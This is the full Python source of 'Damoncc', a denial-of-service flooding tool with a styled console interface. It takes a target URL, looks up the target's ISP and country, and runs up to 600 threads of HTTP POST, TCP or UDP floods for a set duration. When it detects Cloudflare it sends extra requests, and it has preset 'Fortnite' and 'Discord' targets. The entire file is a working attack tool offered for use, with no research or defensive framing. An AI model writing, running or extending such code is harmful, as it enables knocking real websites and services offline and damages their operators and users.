import requests
import threading
import random
import string
import time
import os
import socket
from urllib.parse import urlparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from pynput import keyboard

# Setup console for styled output
console = Console()

# Global attack parameters
target_url = None
attack_method = None
threads = None
duration = None
stats = {"sent": 0, "failed": 0, "down": False, "cloudflare": False}
stop_attack_flag = False
target_details = {"isp": "N/A", "org": "N/A", "country": "N/A"}
cloudflare_alerted = False

# Function to set terminal title
def set_terminal_title(title):
    if os.name == 'nt':  # Windows
        os.system(f'title {title}')
    else:  # Linux/Mac
        os.system(f'echo -ne "\033]0;{title}\007"')

# Set default terminal title
set_terminal_title("Damoncc · Username root · Online 1 · Expiry On Now/11/25 · Ongoing 0")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_target_details(url):
    try:
        parsed_url = urlparse(url)
        target_ip = parsed_url.hostname if parsed_url.hostname else url
        response = requests.get(f"http://ip-api.com/json/{target_ip}").json()
        if response["status"] == "success":
            return {
                "isp": response.get("isp", "N/A"),
                "org": response.get("org", "N/A"),
                "country": response.get("country", "N/A")
            }
        else:
            console.print("[bold red]Failed to fetch target details.[/bold red]")
            return {"isp": "N/A", "org": "N/A", "country": "N/A"}
    except Exception as e:
        console.print(f"[bold red]Error fetching target details: {e}[/bold red]")
        return {"isp": "N/A", "org": "N/A", "country": "N/A"}

def detect_cloudflare(headers, content):
    global cloudflare_alerted
    if "CF-Ray" in headers or "cloudflare" in headers.get("Server", "").lower() or "cloudflare" in content.lower():
        stats["cloudflare"] = True
        if not cloudflare_alerted:
            console.print("[bold yellow]Cloudflare detected. Strengthening attack...[/bold yellow]")
            cloudflare_alerted = True
        return True
    return False

def flood_http():
    global stats, stop_attack_flag
    while time.time() < end_time and not stop_attack_flag:
        try:
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT {random.randint(6, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.0 (KHTML, like Gecko) Chrome/{random.randint(80, 110)}.0.{random.randint(4000, 5000)}.0 Safari/{random.randint(500, 600)}.36",
            }
            payload = {
                "key": random_string(15),
                "value": random_string(30),
                "random": random.randint(1, 1000),
            }
            response = requests.post(target_url, headers=headers, data=payload, timeout=5)

            if detect_cloudflare(response.headers, response.text):
                # Strengthen attack if Cloudflare is detected
                for _ in range(5):  # Send additional requests
                    requests.post(target_url, headers=headers, data=payload, timeout=5)

            if response.status_code in range(500, 600) or response.status_code in range(400, 500):
                stats["down"] = True
                stop_attack_flag = True
                break

            stats["sent"] += 1
        except requests.RequestException:
            stats["failed"] += 1

def flood_tcp():
    global stats, stop_attack_flag
    target_ip = urlparse(target_url).hostname if urlparse(target_url).hostname else target_url
    target_port = 80  # Default port for TCP

    while time.time() < end_time and not stop_attack_flag:
        try:
            # Create a TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))

            # Send a payload
            payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            sock.send(payload.encode())

            # Close the socket
            sock.close()

            stats["sent"] += 1
        except Exception:
            stats["failed"] += 1

def flood_udp():
    global stats, stop_attack_flag
    target_ip = urlparse(target_url).hostname if urlparse(target_url).hostname else target_url
    target_port = 53  # Default port for UDP

    while time.time() < end_time and not stop_attack_flag:
        try:
            # Create a UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            # Send a payload
            payload = random_string(100).encode()
            sock.sendto(payload, (target_ip, target_port))

            # Close the socket
            sock.close()

            stats["sent"] += 1
        except Exception:
            stats["failed"] += 1

def stop_attack_listener():
    def on_press(key):
        global stop_attack_flag
        if key == keyboard.Key.f2:
            stop_attack_flag = True
            return False

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

def display_status():
    attack_details = Table.grid(expand=False)
    attack_details.add_column(justify="left", style="bold cyan")
    attack_details.add_column(justify="left", style="magenta")

    attack_details.add_row("Host", f"[ {target_url} ]")
    attack_details.add_row("Duration", f"[ {duration} ]")
    attack_details.add_row("Method", f"[ {attack_method.lower()} ]")
    attack_details.add_row("Target ISP", f"[ {target_details['isp']} ]")
    attack_details.add_row("Target ORG", f"[ {target_details['org']} ]")
    attack_details.add_row("Target Country", f"[ {target_details['country']} ]")

    status_panel = Table.grid(expand=False)
    status_panel.add_column(justify="left", style="bold green")
    status_panel.add_column(justify="left", style="magenta")

    status_panel.add_row("Success", f"[ {stats['sent']} ]")
    status_panel.add_row("Failed", f"[ {stats['failed']} ]")
    status_panel.add_row("Down", f"[ {'Yes' if stats['down'] else 'No'} ]")
    status_panel.add_row("Cloudflare", f"[ {'Yes' if stats['cloudflare'] else 'No'} ]")

    console.print(Panel(attack_details, title="Attack Details", border_style="cyan"))
    console.print(Panel(status_panel, title="Current Status", border_style="cyan"))
    console.print("[bold magenta]Stop DDOS: Press F2[/bold magenta]")

def main_menu():
    global target_url, attack_method, threads, duration, end_time, target_details

    clear_screen()
    console.print(Panel("[bold green]Welcome to Damoncc[/bold green]", border_style="green"))

    # Simulate installation progress with dynamic updates
    with Progress() as progress:
        task = progress.add_task("[cyan]Installing requirements...", total=4)
        for i in range(4):
            time.sleep(1)  # Simulate installation delay
            progress.update(task, advance=1, description=f"[cyan]Installing requirements... ({i+1}/4)")

    target_url = console.input("[bold cyan]Enter target URL: [/bold cyan]").strip()
    target_details = get_target_details(target_url)

    console.print("\n[bold magenta]Select attack method:[/bold magenta]")
    console.print("[1] HTTP\n[2] TCP\n[3] UDP\n[4] Fortnite\n[5] Discord")
    method_choice = console.input("\n[bold cyan]Enter your choice (1/2/3/4/5): [/bold cyan]").strip()
    if method_choice == "1":
        attack_method = "HTTP"
    elif method_choice == "2":
        attack_method = "TCP"
    elif method_choice == "3":
        attack_method = "UDP"
    elif method_choice == "4":
        attack_method = "Fortnite"
        target_url = "fortnite-server.com"  # Example Fortnite server
    elif method_choice == "5":
        attack_method = "Discord"
        target_url = "discord.com"  # Example Discord server
    else:
        console.print("[bold red]Invalid or unsupported choice. Exiting...[/bold red]")
        return

    threads = int(console.input("[bold cyan]Enter number of threads (Max 600): [/bold cyan]").strip())
    threads = min(threads, 600)

    duration = int(console.input("[bold cyan]Enter attack duration (in seconds): [/bold cyan]").strip())
    end_time = time.time() + duration

    clear_screen()

def start_attack():
    global stop_attack_flag

    # Change terminal title to indicate ongoing attack
    set_terminal_title("Damoncc · Username root · Online 1 · Expiry On Now/11/25 · Ongoing 1")

    threads_list = []
    threading.Thread(target=stop_attack_listener, daemon=True).start()

    # Select the attack method
    if attack_method == "HTTP":
        attack_function = flood_http
    elif attack_method == "TCP":
        attack_function = flood_tcp
    elif attack_method == "UDP":
        attack_function = flood_udp
    elif attack_method == "Fortnite":
        attack_function = flood_tcp  # Use TCP for Fortnite
    elif attack_method == "Discord":
        attack_function = flood_http  # Use HTTP for Discord

    for _ in range(threads):
        thread = threading.Thread(target=attack_function)
        thread.start()
        threads_list.append(thread)

    while any(thread.is_alive() for thread in threads_list) and not stop_attack_flag:
        clear_screen()
        display_status()
        time.sleep(1)

    for thread in threads_list:
        thread.join()

    clear_screen()
    display_status()
    if stats["down"]:
        console.print("[bold green]The target is down![/bold green]")
    else:
        console.print("\n[bold green]Attack completed![/bold green]")

    # Revert terminal title to default after attack
    set_terminal_title("Damoncc · Username root · Online 1 · Expiry On Now/11/25 · Ongoing 0")

if __name__ == "__main__":
    main_menu()
    if target_url and attack_method and threads and duration:
        start_attack()